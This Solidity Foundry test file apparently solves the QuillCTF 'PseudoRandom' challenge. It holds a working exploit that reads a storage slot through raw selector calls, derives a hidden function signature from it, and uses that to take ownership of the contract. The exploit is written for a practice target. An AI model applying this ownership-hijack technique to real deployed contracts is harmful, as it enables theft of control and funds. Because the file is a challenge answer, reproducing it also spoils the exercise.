// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/PseudoRandom.sol";

contract PseudoRandomTest is Test {
    PseudoRandom public pseudoRandom;

    address public attacker;

    function testPseudoRandomExploit() public {
        attacker = vm.addr(2);
        vm.createSelectFork("https://eth.llamarpc.com");

        // Exploit
        vm.startPrank(attacker, attacker);
        pseudoRandom = new PseudoRandom();
        console.log("pseudoRandom: ", address(pseudoRandom));
        console.log("original owner:", pseudoRandom.owner());
        (, bytes memory r) = address(pseudoRandom).call(abi.encodeWithSelector(0x3bc5de30, uint256(uint160(attacker)) + block.chainid));
        uint256 slot = abi.decode(r, (uint));
        console.log("slot:", slot);
        (, bytes memory res) = address(pseudoRandom).call(abi.encodeWithSelector(0x3bc5de30, slot));
        bytes4 sig = abi.decode(res, (bytes4));
        console.logBytes4(sig);
        address(pseudoRandom).call(abi.encodeWithSelector(sig, bytes32(0), attacker));
        console.log("owner:", pseudoRandom.owner());
        vm.stopPrank(); 

        assertEq(pseudoRandom.owner(), attacker);   
    }
}
